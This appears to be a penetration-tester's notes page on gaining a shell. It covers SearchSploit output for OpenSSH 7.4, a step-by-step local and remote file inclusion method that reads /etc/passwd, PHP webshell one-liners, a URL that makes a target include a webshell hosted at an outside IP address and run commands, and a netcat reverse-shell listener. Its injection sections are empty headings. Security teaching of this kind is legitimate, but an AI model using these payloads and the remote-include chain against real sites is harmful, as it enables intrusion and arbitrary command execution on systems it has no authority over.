# Exploitation (Getting Shell)
## Common Vulnerability
We search the vulnerability based on the banner/software using SearchSploit.  
**searchsploit OpenSSH 7.4**

```
[i] Found (#2): /opt/exploit-database/files_exploits.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/exploit-database/files_shellcodes.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

--------------------------------------------------------------------------------------------------------------------------------------------------- -----------------------------------------
 Exploit Title                                                                                                                                     |  Path
                                                                                                                                                   | (/opt/exploit-database/)
--------------------------------------------------------------------------------------------------------------------------------------------------- -----------------------------------------
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                               | exploits/linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                           | exploits/linux/remote/40963.txt
--------------------------------------------------------------------------------------------------------------------------------------------------- -----------------------------------------
Shellcodes: No Result

```
Our goal is to getting the shell so we try to find a RCE (Remove Command|Code Execution) vulnerability.   
Please refer https://www.exploit-db.com/searchsploit for searching details.   
The we search the PoC code and try it.


## Web

The principal of finding a vulnerability of WebApp is the following steps.   
1.Enumerate the user input.
1.1. It can be GET parameters, POST parameters, COOKIE values, HEADERS or a part of URL.   
2.Try test pattern.
2.1 We try a different input to observe the behavior.


### RFI / LFI
We check all parameter (GET/POST/COOKIE), and if we have a parameter looks like a file, we tamper the request.
e.g.)`https://shinobot.com/showfile.php?file=image.jpg`   
First we try `https://shinobot.com/showfile.php?file=./image.jpg`, if we still able to see the same response, it is very likely that the parameter is handled as a path. 
Next we try to read a local file.
`https://shinobot.com/showfile.php?file=/etc/passwd`  
If we can see the result, we have the ability to read a local file.  
Next we check whether we can read the php file itself.
`https://shinobot.com/showfile.php?file=showfile.php`   
If we do not get any responses, it means the path is **included** (loaded & executed).   
We check if we can load remotely.  
`https://shinobot.com/showfile.php?file=https://www.google.com/`   
If we see a code from Google, it means we can load the file remotely. We host a webshell on our server.
`<?php system($_REQUEST['c']); ?>`
`<?php passthru($_REQUEST['c']); ?>`

`http://59.106.208.91/webshell.txt`
Then we try to load our webshell through the web server.
`https://shinobot.com/showfile.php?file=http://59.106.208.91/webshell.txt&c=id`  
"c=id" is for the webshell and we try to execute the id command. 




### OS Command Injection
### SQL Injection

# ReverseShell
## Listener
```nc -lvp 4444```
